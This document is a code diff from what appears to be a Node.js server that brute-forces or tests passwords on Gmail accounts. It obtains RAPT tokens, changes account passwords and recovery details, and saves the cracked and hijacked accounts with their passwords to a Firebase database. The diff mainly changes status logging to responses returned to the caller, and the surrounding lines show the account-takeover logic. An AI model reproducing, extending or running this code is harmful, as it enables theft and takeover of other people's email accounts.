@@ -44,7 +44,6 @@ app.post('/', async function (req, res) {
             let mData = req.body.data.split('★')
             console.log('Received Data: '+mData.length)
             if(mData.length == 6) {
-                res.end('Process')
                 passwordMatching(res, mData, null, 0, 0, mData[4])
             } else {
                 res.end('not 6')
@@ -226,7 +225,7 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
                                             }
                                             send['PASS'] = password
                                             database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                            console.log(mData[0]+' 5')
+                                            connection.end(mData[0]+' 5')
                                         }
                                     } catch (e) {}
                                 })
@@ -241,7 +240,7 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
                                 }
                                 send['PASS'] = password
                                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                console.log(mData[0]+' 4')
+                                connection.end(mData[0]+' 4')
                             }
                         } catch (e) {}
                     })
@@ -256,7 +255,7 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
                     }
                     send['PASS'] = password
                     database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                    console.log(mData[0]+' 13')
+                    connection.end(mData[0]+' 13')
                 }
             } catch (e) {}
         }
@@ -264,7 +263,7 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
         try {
             if(output == 0 && connection != null) {
                 console.log('Next')
-                console.log(mData[0]+' 1')
+                connection.end(mData[0]+' 1')
             }
         } catch (e) {}
     })
@@ -340,7 +339,7 @@ function getRaptToken(connection, password, mData, sendCookies) {
                                 }
                                 send['PASS'] = password
                                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                console.log(mData[0]+' 2')
+                                connection.end(mData[0]+' 2')
                             }
                         } catch (e) {}
                     })
@@ -356,7 +355,7 @@ function getRaptToken(connection, password, mData, sendCookies) {
                 }
                 send['PASS'] = password
                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                console.log(mData[0]+' 3')
+                connection.end(mData[0]+' 3')
             }
         } catch (e) {}
     })
@@ -555,7 +554,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                                                     let send = { create:year, number:mData[2], password:changePass, recovery:recovery }
                                                                                                     console.log(send)
                                                                                                     database.child('/code/gmail/completed/'+mData[1].split('/')[0]+'/'+mGmail).update(send)
-                                                                                                    console.log(mData[0]+' 12')
+                                                                                                    connection.end(mData[0]+' 12')
                                                                                                 }
                                                                                             } catch (e) {}
                                                                                             
@@ -567,7 +566,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                                                     }
                                                                                                     send['PASS'] = password
                                                                                                     database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                                                                                    console.log(mData[0]+' 11')
+                                                                                                    connection.end(mData[0]+' 11')
                                                                                                 }
                                                                                             } catch (e) {}
                                                                                         })
@@ -601,7 +600,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                                 let send = { create:year, number:mData[2], password:changePass, recovery:recovery }
                                                                                 console.log(send)
                                                                                 database.child('/code/gmail/completed/'+mData[1].split('/')[0]+'/'+mGmail).update(send)
-                                                                                console.log(mData[0]+' 12')
+                                                                                connection.end(mData[0]+' 12')
                                                                             }
                                                                         } catch (e) {}
                                                                         
@@ -613,7 +612,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                                 }
                                                                                 send['PASS'] = password
                                                                                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                                                                console.log(mData[0]+' 11')
+                                                                                connection.end(mData[0]+' 11')
                                                                             }
                                                                         } catch (e) {}
                                                                     })
@@ -630,7 +629,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                 }
                                                                 send['PASS'] = password
                                                                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                                                console.log(mData[0]+' 99')
+                                                                connection.end(mData[0]+' 99')
                                                             }
                                                         } catch (e) {}
                                                     }
@@ -645,7 +644,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                         }
                                                         send['PASS'] = password
                                                         database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                                        console.log(mData[0]+' 9')
+                                                        connection.end(mData[0]+' 9')
                                                     }
                                                 } catch (e) {}
                                             })
@@ -662,7 +661,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                             }
                                             send['PASS'] = password
                                             database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                            console.log(mData[0]+' 8')
+                                            connection.end(mData[0]+' 8')
                                         }
                                     } catch (e) {}
                                 })
@@ -677,7 +676,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                 }
                                 send['PASS'] = password
                                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                console.log(mData[0]+' 7')
+                                connection.end(mData[0]+' 7')
                             }
                         } catch (e) {}
                     })
@@ -693,7 +692,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                 }
                 send['PASS'] = password
                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                console.log(mData[0]+' 6')
+                connection.end(mData[0]+' 6')
             }
         } catch (e) {}
     })
